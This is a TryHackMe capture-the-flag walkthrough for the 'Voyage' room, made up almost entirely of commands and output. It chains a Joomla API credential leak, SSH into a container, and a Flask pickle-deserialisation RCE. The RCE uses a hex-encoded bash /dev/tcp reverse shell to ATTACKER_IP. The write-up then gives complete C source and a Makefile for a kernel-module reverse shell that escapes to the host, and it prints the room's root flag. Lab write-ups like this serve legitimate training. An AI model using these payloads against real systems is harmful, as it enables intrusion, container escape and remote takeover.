# 📁 Voyage Walkthrough (Complete Practical Writeup)

Author: imr00t  
Platform: TryHackMe  
Difficulty: Medium  

------------------------------------------------------------

OVERVIEW

Joomla → SSH → Docker → Internal Network → Flask → Pickle RCE → Container → Kernel Module → Host Root

------------------------------------------------------------

TARGET

TARGET_IP

------------------------------------------------------------

RECON

imr00t@kali:~/Desktop$ nmap TARGET_IP

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

------------------------------------------------------------

JOOMLA ENUMERATION

imr00t@kali:~/Desktop$ perl joomscan.pl -u http://TARGET_IP

------------------------------------------------------------

JOOMLA API EXPLOIT

imr00t@kali:~/Desktop$ curl "http://TARGET_IP/api/index.php/v1/config/application?public=true"

username: root
password: RootPassword@1234

------------------------------------------------------------

SSH ACCESS

imr00t@kali:~/Desktop$ ssh root@TARGET_IP -p 2222

root@f5eb774507f2:~#

------------------------------------------------------------

CONTAINER CHECK

root@f5eb774507f2:~# ls /

.dockerenv

------------------------------------------------------------

INTERNAL NETWORK

root@f5eb774507f2:~# ip a

inet INTERNAL_CONTAINER

root@f5eb774507f2:~# nmap INTERNAL_RANGE

INTERNAL_HOST
INTERNAL_APP
INTERNAL_CONTAINER

------------------------------------------------------------

FLASK APP

root@f5eb774507f2:~# curl http://INTERNAL_APP:5000

------------------------------------------------------------

LOGIN

root@f5eb774507f2:~# curl -i -X POST http://INTERNAL_APP:5000 -d "username=admin&password=admin"

HTTP/1.1 200 OK
Set-Cookie: session_data=80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e

------------------------------------------------------------

PAYLOAD

imr00t@kali:~/Desktop$ python3 11.py

80049551000000000000008c05706f736978948c0673797374656d9493948c3662617368202d63202262617368202d69203e26202f6465762f7463702fATTACKER_IP/4444 0>&1"94859452942e

------------------------------------------------------------

LISTENER

imr00t@kali:~/Desktop$ nc -lvnp 4444

listening on [any] 4444 ...

------------------------------------------------------------

EXPLOIT

root@f5eb774507f2:~# curl -H "Cookie: session_data=PAYLOAD" http://INTERNAL_APP:5000

------------------------------------------------------------

SHELL

connect to ATTACKER_IP

root@d221f7bc7bf8:/#

------------------------------------------------------------

USER FLAG

root@d221f7bc7bf8:/# cat /root/user.txt

------------------------------------------------------------

PRIV ESC

root@d221f7bc7bf8:/# capsh --print

cap_sys_module

------------------------------------------------------------

MODULE

root@d221f7bc7bf8:/# cat > reverse-shell.c

#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL};

static char* envp[] = {
 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL
};

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

module_init(reverse_shell_init);

------------------------------------------------------------

MAKEFILE

printf 'obj-m += reverse-shell.o

all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules

clean:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
' > Makefile

------------------------------------------------------------

COMPILE

root@d221f7bc7bf8:/# make

LD [M] /root/reverse-shell.ko

------------------------------------------------------------

EXECUTE

root@d221f7bc7bf8:/# insmod reverse-shell.ko

------------------------------------------------------------

HOST SHELL

connect to ATTACKER_IP

root@ip-10-48-184-159:/#

------------------------------------------------------------

ROOT FLAG

root@ip-10-48-184-159:/# cat /root/root.txt

THM{ace91ec899f84498a74629b078bdceff}

------------------------------------------------------------

END
